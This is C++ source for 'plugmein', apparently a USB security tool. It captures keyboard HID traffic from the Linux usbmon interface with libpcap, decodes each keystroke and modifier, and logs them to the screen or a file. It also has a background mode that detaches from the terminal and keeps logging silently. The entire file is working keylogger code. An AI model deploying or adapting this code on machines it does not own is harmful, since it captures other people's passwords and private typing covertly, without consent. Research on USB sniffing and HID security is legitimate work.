/*
 * This file is part of the plugmein USB security toolset.
 *
 * (C) 2016 by Sebastian Krahmer,
 *             sebastian [dot] krahmer [at] gmail [dot] com
 *
 * plugmein is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * plugmein is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with plugmein.  If not, see <http://www.gnu.org/licenses/>.
 */

// If you wonder about the name:
// https://www.youtube.com/watch?v=PStFpDMlSK0

// t2infosec release

#include <cstdio>
#include <cstring>
#include <string>
#include <cerrno>
#include <stdint.h>
#include <unistd.h>
#include "usb.h"
#include "hid.h"


extern "C" {
#include <pcap.h>
}



using namespace std;
using namespace plugmein;


namespace plugmein {

FILE *fout = stdout;


class usbmon {

	string dev, err{""};
	uint16_t bus_id;
	int dl_type{0};
	bool last_was_mod{0};

	pcap_t *ph{nullptr};
public:

	usbmon(const string &d, uint16_t id) : dev(d), bus_id(id)
	{
	}

	virtual ~usbmon()
	{
		if (ph)
			pcap_close(ph);
	}

	const char *why()
	{
		return err.c_str();
	}

	int init();

	int sniff();

	friend void handle_pkt(unsigned char *, const struct pcap_pkthdr *, const unsigned char *);
};


int usbmon::init()
{
	char ebuf[PCAP_ERRBUF_SIZE] = {0};

	if (!(ph = pcap_create(dev.c_str(), ebuf))) {
		err = "usbmon::init:pcap_create:" + string(ebuf);
		return -1;
	}

#ifdef HAVE_IMMEDIATE
	// dont mind errors
	pcap_set_immediate_mode(ph, 1);
#endif

	if (pcap_set_snaplen(ph, 1500) < 0) {
		err = "usbmon::init:pcap_set_snaplen: error setting snaplen.";
		return -1;
	}

	if (pcap_activate(ph) < 0) {
		err = "usbmon::init:pcap_activate: error activating device.";
		return -1;
	}

	dl_type = pcap_datalink(ph);

	if (dl_type != DLT_USB_LINUX && dl_type != DLT_USB_LINUX_MMAPPED) {
		err = "usbmon::init: Not a USB monitoring device.";
		return -1;
	}

	return 0;
}


void handle_pkt(unsigned char *uptr, const struct pcap_pkthdr *h, const unsigned char *pkt)
{
	if (!pkt || h->caplen < sizeof(usb_hdr))
		return;

	// passed "this"
	usbmon *dis = reinterpret_cast<usbmon *>(uptr);

	const usb_hdr *uh = reinterpret_cast<const usb_hdr *>(pkt);

	// wrong device?
	if (dis->bus_id != 0 && uh->bus_id != dis->bus_id)
		return;

	if (uh->event_type != EVENT_COMPLETE)
		return;

	// direction: from device to host?
	if ((uh->endpoint & 0x80) != 0x80)
		return;
	if (uh->data_flag != 0)
		return;
	if (uh->data_len == 0)
		return;

	// Huh?
	if (sizeof(*uh) + uh->data_len > h->caplen || uh->data_len != sizeof(hid_tab))
		return;

	hid_tab data;
	memcpy(&data, (char *)uh + h->caplen - sizeof(data), sizeof(data));

	// Its possible someone is pressing modifier keys, without
	// any data, but this would print modifier noise for uppercase
	// letters, so just print the modifiers along with real data and silently
	// skip modifier-only notifications
	if (data.key[0] != 0) {
		if (data.mod & HID_MOD_LCTRL)
			fprintf(fout, "<LCTRL> + ");
		if (data.mod & HID_MOD_LSHIFT)
			fprintf(fout, "<LSHIFT> + ");
		if (data.mod & HID_MOD_LALT)
			fprintf(fout, "<LALT> + ");
		if (data.mod & HID_MOD_LGUI)
			fprintf(fout, "<LGUI> + ");
		if (data.mod & HID_MOD_RCTRL)
			fprintf(fout, "<RCTRL> + ");
		if (data.mod & HID_MOD_RSHIFT)
			fprintf(fout, "<RSHIFT> + ");
		if (data.mod & HID_MOD_RALT)
			fprintf(fout, "<RALT> + ");
		if (data.mod & HID_MOD_RGUI)
			fprintf(fout, "<RGUI> + ");
	}

	// key released
	uint64_t zero = 0;
	if (memcmp(&data, &zero, sizeof(zero)) == 0)
		return;

	if (data.mod != HID_MOD_NONE)
		dis->last_was_mod = 1;
	else
		dis->last_was_mod = 0;

	if (hid_tab_entry[data.key[0]].str)
		fprintf(fout, "%s", hid_tab_entry[data.key[0]].str);

	if (data.key[0] == 0x58 || data.key[0] == 0x9E || data.key[0] == 0x28)
		fprintf(fout, "\n");

	return;
}


int usbmon::sniff()
{
	for (;;)
		pcap_dispatch(ph, -1, handle_pkt, reinterpret_cast<unsigned char *>(this));

	return 0;
}

} // namespace


int main(int argc, char **argv)
{
	bool bg = 0;
	int c = 0;
	uint16_t bus_id = 0;
	string device = "usbmon0", ofile = "";

	while ((c = getopt(argc, argv, "o:B:d:D")) != -1) {
		switch (c) {
		case 'o':
			ofile = optarg;
			break;
		case 'B':
			bus_id = (uint16_t)strtoul(optarg, nullptr, 10);
			break;
		case 'D':
			bg = 1;
			break;
		case 'd':
			device = optarg;
			break;
		default:
			printf("Usage: plugmein [-d device] [-o outfile] [-B bus-id] [-D]\n");
			return -1;
		}
	}

	if (ofile.size()) {
		fout = fopen(ofile.c_str(), "a");
		if (!fout) {
			perror("fopen");
			exit(errno);
		}
	}

	if (bg) {
		if (!ofile.size()) {
			fprintf(stderr, "Background option needs -o\n");
			return -1;
		}

		if (fork() != 0)
			exit(0);

		close(0); close(1); close(2);
		setsid();
	}


	usbmon u(device, bus_id);

	// Yala, yala!!
	setvbuf(fout, nullptr, _IONBF, 0);

	if (u.init() < 0 || u.sniff() < 0) {
		if (!bg)
			fprintf(stderr, "%s\n", u.why());
		return -1;
	}

	return 0;
}

